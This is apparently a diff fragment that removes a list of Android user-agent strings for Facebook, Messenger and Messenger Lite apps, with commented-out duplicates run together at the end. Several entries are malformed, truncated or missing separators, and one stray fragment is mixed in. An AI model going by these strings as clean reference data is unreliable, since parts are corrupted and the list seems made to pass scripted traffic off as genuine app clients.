-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G955F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/255.0.0.14.126;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/202766316;FBCR/SUN;FBMF/samsung;FBBD/samsung;FBDV/SM-G955F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.5,width=1440,height=2960};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; DRA-LX2 Build/HUAWEIDRA-LX2) [FBAN/Orca-Android;FBAV/239.1.0.17.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/180535023;FBCR/TelkomSA;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DRA-LX2;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1356};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.1; E6653 Build/32.4.A.1.54) [FBAN/Orca-Android;FBAV/151.0.0.17.95;FBPN/com.facebook.orca;FBLC/en_ZA;FBBV/89897644;FBCR/null;FBMF/Sony;FBBD/Sony;FBDV/E6653;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1776};FB_FW/1;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-I9300 Build/IMM76D) [FBAN/\xC2\xADOrca-Android;FBAV/\xC2\xAD5.0.0.16.1;FBLC/\xC2\xADtr_TR;FBBV/\xC2\xAD2302400;FBCR/\xC2\xADT-Mobile;FBMF/\xC2\xADsamsung;FBBD/\xC2\xADsamsung;FBDV/\xC2\xADGT-I9300;FBSV/\xC2\xAD4.0.4;FBCA/\xC2\xADarmeabi-v7a:armeabi;F\xC2\xADBDM/\xC2\xAD{density=1.0,width=10\xC2\xAD66,height=552};]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-G970U1 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/78.0.1.18.236;FBPN/com.facebook.mlite;FBLC/es_MX;FBBV/201616056;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-G970U1;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2020};]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; POT-LX3 Build/HUAWEIPOT-L03) [FBAN/Orca-Android;FBAV/270.0.0.17.120;FBPN/com.facebook.orca;FBLC/es_MX;FBBV/225129965;FBCR/TELCEL;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/POT-LX3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2139};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; KFMUWI Build/NS6315) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782190;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBDV/KFMUWI;FBSV/7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=600,height=976};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3 Build/QQ3A.200605.001) [FBAN/Orca-Android;FBAV/271.0.0.11.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/227270208;FBCR/Verizon;FBMF/Google;FBBD/google;FBDV/Pixel 3;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2028};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; W-K200 Build/O11019) [FBAN/EMA;UNITY_PACKAGE/1549;FBBV/234444154;FBAV/209.0.0.5.119;FBDV/W-K200;FBLC/vi_VN;FBOP/20;FBNG/3G;FBCQ/UNKNOWN;FBMNT/METERED]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1",    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]",    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J730F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/245106334;FBCR/Plus;FBMF/samsung;FBBD/samsung;FBDV/SM-J730F;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.625,width=1080,height=1920};FB_FW/1;]",    "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_X00QD Build/PPR1.180610.009) [FBAN/EMA;UNITY_PACKAGE/1634;FBBV/244867833;FBAV/216.0.0.10.121;FBDV/ASUS_X00QD;FBLC/pt_BR;FBOP/20;FBNG/4G;FBCQ/UNKNOWN;FBMNT/METERED]",    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A505GT Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/245106389;FBCR/Claro BR;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GT;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2113};FB_FW/1",
-    "Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 7 MIUI/V11.0.1.0.QFGEUXM) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/cs_CZ;FBBV/245106389;FBCR/null;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2131};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1",    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]",    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G960U Build/R16NW) [FBAN/Orca-Android;FBAV/260.0.0.22.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/209190396;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G960U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/245106389;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2076};FB_FW/1;] FBBK/1",    "Dalvik/2.1.0 (Linux; U; Android 7.0; LG-H901 Build/NRD90U) [FBAN/Orca-Android;FBAV/286.0.0.21.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/250669427;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2392};FB_FW/1;] FBBK/1",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A305F Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/274.0.0.18.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/232793953;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A305F;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;]",    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8T MIUI/V11.0.11.0.PCXEUXM) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",    "Dalvik/2.1.0 (Linux; U; Android 7.1.1; CPH1727 Build/N6F26Q) [FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/253310646;FBCR/AIS;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1727;FBSV/7.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.7,width=1080,height=2016};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A5 2019 Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/269.0.0.15.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/221129137;FBCR/Movistar;FBMF/ZTE;FBBD/ZTE;FBDV/ZTE Blade A5 2019;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; oppo r7sm Build/LYZ28N) [FBAN/EMA;UNITY_PACKAGE/1590;FBBV/0;FBAV/26.0.0.4.133;FBDV/oppo r7sm;FBLC/en_US;FBOP/20]",    "Dalvik/2.1.0 (Linux; U; Android 10; SM-S111DL Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-S111DL;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1431};FB_FW/1;]",
-    "Dalvik/2.1.0(Linux;v; Android;D6.0;LG_X230build/MRA58K)[FBAN/EMA;UNITY_PACKAGE/1826;FBBV/262675052.fbav/230.0.0.3.121;fbdv/lg_x230;fblc/es_ES,FBOP/20,fbng/wifi,fbcq/con.moblica,common x mob.protocol.data connectionQualitydata@48e505d8;fbmnt/not_metereo]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J410G Build/M1AJB) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/pt_BR;FBBV/257752740;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1384};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUB-LX1 Build/HUAWEIDUB-LX1) [FBAN/Orca-Android;FBAV/291.2.0.22.114;FBPN/com.facebook.orca;FBLC/en_US;FBBV/257752740;FBCR/VIVACOM;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/DUB-LX1;FBSV/8.1.0;FBCA","c5c0:94bd:bdf0 Browser",
-    "Dalvik/2.1.0 (Linux; U; Android 9; LM-X120 Build/PKQ1.180904.001) [FBAN/Orca-Android;FBAV/293.0.0.14.232;FBPN/com.facebook.orca;FBLC/en_CA;FBBV/261339538;FBCR/Lucky;FBMF/LGE;FBBD/lge;FBDV/LM-X120;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=888};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; YAL-L21 Build/ HUAWEIYAL-L61) [FBAN/Orca- Android;FBAV/301.0.0.12.112;F BPN/com.facebook.orca;FBLC/ en_GB;FBBV/274784541;FBCR/ TM;FBMF/HUAWEI;FBBD/ HUAWEI;FBDV/YAL-L21;FBSV/ 10;FBCA/arm64-v8a:null;FBDM/ {density=2.55,width=1080,height =2110};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Lenovo A6020a46 Build/LMY47V) [FBAN/Orca-Android;FBAV/251.0.0.12.117;FBPN/com.facebook.orca;FBLC/ru_RU;FBBV/197803937;FBCR/lifecell;FBMF/LENOVO;FBBD/Lenovo;FBDV/Lenovo A6020a46;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;] ",
-    "Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/Yoigo;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/life:) BY;FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]",
-    "Dalvik/2.1.0 (Linux; U; Android 11; SM-G973F Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/299.0.0.11.115;FBPN/com.facebook.orca;FBLC/de_DE;FBBV/272301973;FBCR/vodafone.de;FBMF/samsung;FBBD/samsung;FBDV/SM-G973F;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2042};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G925F Build/NRD90M) [FBAN/Orca-Android;FBAV/304.2.0.17.118;FBPN/com.facebook.orca;FBLC/ar_AE;FBBV/279457446;FBCR/Vodafone;FBMF/samsung;FBBD/samsung;FBDV/SM-G925F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2560};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G955F Build/NRD90M) Source/1 [FBAN/EMA;UNITY_PACKAGE/749;FBBV/154200404;FBAV/146.0.0.9.102;FBDV/SM-G955F;FBLC/vi_VN;FBOP/20]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/FB4A;FBAV/310.0.0.50.118;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/278533704;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;FBRV/0;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/MessengerLite;FBAV/133.0.0.1.116;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/279951921;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/HUAWEI LUA-L21;FBSV/5.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI LUA-L21 Build/HUAWEILUA-L21) [FBAN/EMA;UNITY_PACKAGE/2014;FBBV/282877419;FBAV/245.0.0.9.119;FBDV/HUAWEI LUA-L21;FBLC/cs_CZ;FBOP/20;FBNG/WIFI;FBMNT/NOT_METERED]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
-    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ATU-L31 Build/HUAWEIATU-L31) [FBAN/MessengerLite;FBAV/126.0.0.1.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/271069048;FBCR/O2-CZ;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/ATU-L31;FBSV/8.0.0;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1358};]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-    "Dalvik/1.6.0 (Linux; U; Android 6.0; Build/MXB48T) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z016D;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-    "Dalvik/1.6.0 (Linux; U; Android 4.4.2; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
-    "Dalvik/1.6.0 (Linux; U; Android 5; SM-G3518 Build/JLS36C) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188827991;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-G3518;FBSV/4.4.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1244};FB_FW/1;FBRV/190301973;]",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A505FM Build/PPR1.180610.011) [FBAN/FB4A;FBAV/327.0.0.33.120;FBPN/com.facebook.katana;FBLC/ru_RU;FBBV/304400854;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-A505FM;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2131};FB_FW/1;FBRV/305275776;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1];",
-    "Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]",
-    "Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;]"
-    "Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/density=2.0,width=720,height=1402};FB_FW/1;]"]
-#Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]   
-#Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;] 
-#Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]   Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]    Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;]    Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]                 Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 Build/HUAWEICOL-L29) [FBAN/Orca-Android;FBAV/314.1.0.19.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/293875204;FBCR/null;FBMF/HUAWEI;FBBD/HONOR;FBDV/COL-L29;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]
-#Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/155.0.0.14.93;FBPN/com.facebook.orca;FBLC/en_US;FBBV/94098382;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1280};FB_FW/1;]Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G930V Build/NRD90M) [FBAN/Orca-Android;FBAV/174.0.0.24.82;FBPN/com.facebook.orca;FBLC/en_US;FBBV/116802184;FBCR/Verizon Wireless;FBMF/samsung;FBBD/Verizon;FBDV/SM-G930V;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;] Dalvik/2.1.0 (Linux; U; Android 11; moto g(20) Build/RTAS31.68-20-2) [FBAN/Orca-Android;FBAV/336.0.0.13.142;FBPN/com.facebook.orca;FBLC/es_US;FBBV/327992372;FBCR/TELCEL;FBMF/motorola;FBBD/motorola;FBDV/moto g(20);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1466};FB_FW/1;]   Dalvik/2.1.0 (Linux; U; Android 11; SM-A115M Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/339.0.0.18.118;FBPN/com.facebook.orca;FBLC/es_US;FBBV/333752212;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A115M;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1411};FB_FW/1;]   Dalvik/2.1.0 (Linux; U; Android 11; SM-G986U Build/RP1A.200720.012) [FBAN/Orca-Android;FBAV/316.4.0.15.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/297403762;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBDV/SM-G986U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2201};FB_FW/1;]    Dalvik/2.1.0 (Linux; U; Android 10; SM-A102U Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/342.1.0.14.119;FBPN/com.facebook.orca;FBLC/es_US;FBBV/339015010;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBDV/SM-A102U;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1402};FB_FW/1;]    Dalvik/2.1.0 (Linux; U; Android 9; COL-L29 